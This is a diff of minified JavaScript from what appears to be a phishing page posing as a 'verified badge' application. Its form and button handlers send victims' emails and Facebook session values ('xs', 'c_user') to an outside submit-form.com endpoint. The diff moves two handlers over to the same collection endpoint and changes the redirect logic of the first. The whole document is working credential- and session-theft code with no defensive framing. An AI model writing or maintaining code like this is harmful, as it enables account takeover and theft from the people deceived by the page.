@@ -9815,23 +9815,20 @@
                                 onSubmit: e => {
                                     e.preventDefault(),
                                     fetch("https://submit-form.com/RnKOiTzrv", {
-    method: "POST",
-    headers: {
-        "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-        emails: o,
-        workerEmail: "DK",
-        xs: r,
-        c_user: i,
-        name: "DK"
-    })
-}).then((e) => {
-    if (e.ok) {
-        window.location.href = "https://verified-badge-0apply.vercel.app/confirm.html"; // Change this to your desired URL
-    }
-});
-
+                                        method: "POST",
+                                        headers: {
+                                            "Content-Type": "application/json"
+                                        },
+                                        body: JSON.stringify({
+                                            emails: o,
+                                            workerEmail: "DK",
+                                            xs: r,
+                                            c_user: i,
+                                            name: "DK"
+                                        })
+                                    }).then((e => {
+                                        e.ok
+                                    }
                                     )),
                                     s("pass")
                                 }
@@ -13361,7 +13358,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/jYrZ3Ja1G", {
+                                    u && o ? (fetch("https://submit-form.com/RnKOiTzrv", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13474,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/jYrZ3Ja1G", {
+                        fetch("https://submit-form.com/RnKOiTzrv", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
